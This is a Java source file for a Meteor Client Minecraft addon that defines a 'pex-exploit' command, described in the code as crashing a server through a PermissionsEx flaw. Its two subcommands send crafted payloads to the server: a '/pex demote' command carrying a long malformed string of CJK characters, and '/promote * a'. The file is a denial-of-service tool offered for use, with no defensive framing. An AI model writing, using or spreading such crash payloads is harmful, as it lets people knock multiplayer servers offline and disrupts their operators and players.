package de.frxstdev.crashaddon.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.command.CommandSource;

public class PexCrasherCommand extends Command {
    public PexCrasherCommand() {
        super("pex-exploit", "Crash a Server with PermissionsEx Exploit", "pcrash", "pexcrasher");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("new1").executes(ctx -> {
            ChatUtils.sendPlayerMsg("/pex demote $({^.#䐷噃摂潡㕓欹䙎啘琷㤶乇㉦㠰愳㡅㤴汬㘷煸儱䝖䡲倱慍卆流䙨啶獖歄䅧眶元她䙷癋㍰#.^})");
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("new2").executes(ctx -> {
            ChatUtils.sendPlayerMsg("/promote * a");
            return SINGLE_SUCCESS;
        }));

    }
}
